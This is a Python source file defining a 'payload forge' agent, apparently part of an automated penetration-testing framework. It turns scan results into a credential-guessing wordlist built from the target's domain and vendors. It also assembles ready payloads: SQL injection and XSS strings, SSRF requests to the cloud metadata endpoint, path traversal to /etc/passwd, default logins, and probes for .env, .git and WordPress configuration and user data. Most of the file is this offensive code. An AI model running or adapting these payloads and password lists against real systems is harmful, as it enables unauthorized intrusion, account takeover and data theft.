from datetime import datetime

from core import wordlists as wl
from .base import BaseAgent


class Hephaestus(BaseAgent):
    name = "hephaestus"
    symbol = "🔥"
    display_name = "HEPHAESTUS"
    role = "Payload Forge & Wordlist Generation"

    async def execute(self, target: str, context: dict = None) -> dict:
        hermes = (context or {}).get("hermes", {})
        ares = (context or {}).get("ares", {})

        await self.log("Analyzing findings to forge targeted payloads and wordlists", "info")

        result = {
            "payloads_generated": [],
            "wordlists_created": [],
            "exploitable_targets": [],
            "forge_report": {},
        }

        vulns = ares.get("vulnerabilities", [])
        technologies = hermes.get("technologies", {})
        vendors = hermes.get("vendors", [])
        domain = hermes.get("domain", target)

        await self.log(
            f"Forging from {len(vulns)} findings + {len(technologies)} tech fingerprints + {len(vendors)} vendors",
            "info",
        )

        # 1) Deterministic content-discovery wordlist from recon (no AI).
        discovered_paths = [d.get("url", "") for d in ares.get("directories", []) if d.get("url")]
        try:
            entry = wl.build_target_list(self.mission_id, hermes, discovered_paths)
            result["wordlists_created"].append(entry)
            await self.log(
                f"Content-discovery wordlist: {entry['count']} entries -> {entry['id']}",
                "success",
            )
        except Exception as e:
            await self.log(f"Content wordlist generation failed: {e}", "warn")

        # 2) Credential wordlist (target-flavored password guesses).
        creds = self._build_credentials(domain, vendors, technologies)
        try:
            centry = wl.write_list(f"creds-{wl.slugify(domain)}", creds)
            result["wordlists_created"].append(centry)
            await self.log(f"Credential wordlist: {centry['count']} entries -> {centry['id']}", "success")
        except Exception as e:
            await self.log(f"Credential wordlist write failed: {e}", "warn")

        # 3) Payload sets for identified vulnerability classes.
        for vuln in vulns:
            sev = vuln.get("severity", "info")
            template = vuln.get("template", "")
            matched_at = vuln.get("matched_at", "")
            if sev in ("critical", "high") and matched_at:
                payloads = self._payloads_for_template(template, matched_at)
                if payloads:
                    result["payloads_generated"].extend(payloads)
                    result["exploitable_targets"].append(matched_at)

        result["payloads_generated"].extend(self._generic_web_payloads(technologies))

        result["forge_report"] = {
            "domain": domain,
            "total_payloads": len(result["payloads_generated"]),
            "exploitable_count": len(result["exploitable_targets"]),
            "wordlists": [w["id"] for w in result["wordlists_created"]],
            "wordlist_entries": sum(w["count"] for w in result["wordlists_created"]),
            "timestamp": datetime.utcnow().isoformat(),
        }

        await self.log(
            f"Forge complete: {len(result['payloads_generated'])} payloads | "
            f"{len(result['wordlists_created'])} wordlists | "
            f"{len(result['exploitable_targets'])} exploitable targets",
            "success",
        )
        return result

    def _build_credentials(self, domain: str, vendors: list, technologies: dict) -> list:
        words = set()
        parts = domain.split(".")
        company = parts[0] if parts else domain

        for p in parts:
            if len(p) > 2:
                words.update([p, p.lower(), p.capitalize(),
                              p + "123", p + "2024", p + "2025", p + "!"])

        words.update([
            company, company.lower(), company.upper(), company.capitalize(),
            company + "@123", company + "123!", company + "2024!", company + "@2025",
            company + "_admin", company + "_dev", "admin_" + company,
            company[:4] + "2024", company[:4] + "!", "P@ss" + company,
        ])

        for v in vendors:
            vendor = v.get("vendor", "") if isinstance(v, dict) else str(v)
            first = vendor.split()[0].lower() if vendor.split() else ""
            if first:
                words.update([first + "2024!", first + "@123"])

        all_techs = []
        for tl in technologies.values():
            all_techs.extend(tl)
        if any("WordPress" in t for t in all_techs):
            words.update(["admin", "password", "wordpress", "wp-admin", "admin123", "letmein"])
        if any("Drupal" in t for t in all_techs):
            words.update(["drupal", "admin", "password1", "admin@drupal"])

        words.update([
            "Password1", "Password1!", "Welcome1", "Welcome1!",
            "Summer2024!", "Winter2024!", "Spring2025!", "Fall2024!",
            "January@1", "Admin@123", "Letmein1!", "Changeme1",
            "Qwerty123!", "Company1!", "123456Aa!",
        ])
        return sorted(words)

    def _payloads_for_template(self, template: str, url: str) -> list:
        tl = template.lower()
        if "sqli" in tl or "sql-injection" in tl:
            return [
                {"type": "SQLi", "payload": "' OR '1'='1", "target": url},
                {"type": "SQLi", "payload": "' OR 1=1--", "target": url},
                {"type": "SQLi", "payload": "admin'--", "target": url},
                {"type": "SQLi", "payload": "1' AND SLEEP(5)--", "target": url},
            ]
        if "xss" in tl:
            return [
                {"type": "XSS", "payload": "<script>alert(1)</script>", "target": url},
                {"type": "XSS", "payload": "<img src=x onerror=alert(document.domain)>", "target": url},
                {"type": "XSS", "payload": "javascript:alert(1)", "target": url},
            ]
        if "ssrf" in tl:
            return [
                {"type": "SSRF", "payload": "http://169.254.169.254/latest/meta-data/", "target": url},
                {"type": "SSRF", "payload": "http://localhost:8080/", "target": url},
            ]
        if "lfi" in tl or "path-traversal" in tl:
            return [
                {"type": "LFI", "payload": "../../../etc/passwd", "target": url},
                {"type": "LFI", "payload": "....//....//....//etc/passwd", "target": url},
            ]
        if "default-login" in tl or "default-creds" in tl:
            return [
                {"type": "DefaultCreds", "payload": "admin:admin", "target": url},
                {"type": "DefaultCreds", "payload": "admin:password", "target": url},
                {"type": "DefaultCreds", "payload": "admin:123456", "target": url},
            ]
        return []

    def _generic_web_payloads(self, technologies: dict) -> list:
        all_techs = []
        for tl in technologies.values():
            all_techs.extend([t.lower() for t in tl])

        payloads = [
            {"type": "Recon", "payload": "/../../../etc/passwd", "note": "Path traversal"},
            {"type": "Recon", "payload": "/.git/HEAD", "note": "Git exposure"},
            {"type": "Recon", "payload": "/.env", "note": "Environment file"},
            {"type": "Recon", "payload": "/robots.txt", "note": "Robots disclosure"},
            {"type": "Recon", "payload": "/sitemap.xml", "note": "Sitemap enum"},
        ]
        if any("php" in t for t in all_techs):
            payloads.extend([
                {"type": "PHP", "payload": "<?php phpinfo(); ?>", "note": "PHP info probe"},
                {"type": "PHP", "payload": "/?page=../../../../etc/passwd", "note": "PHP LFI"},
            ])
        if any("wordpress" in t for t in all_techs):
            payloads.extend([
                {"type": "WordPress", "payload": "/wp-json/wp/v2/users", "note": "User enum via API"},
                {"type": "WordPress", "payload": "/wp-content/debug.log", "note": "Debug log"},
                {"type": "WordPress", "payload": "/wp-config.php.bak", "note": "Config backup"},
            ])
        return payloads
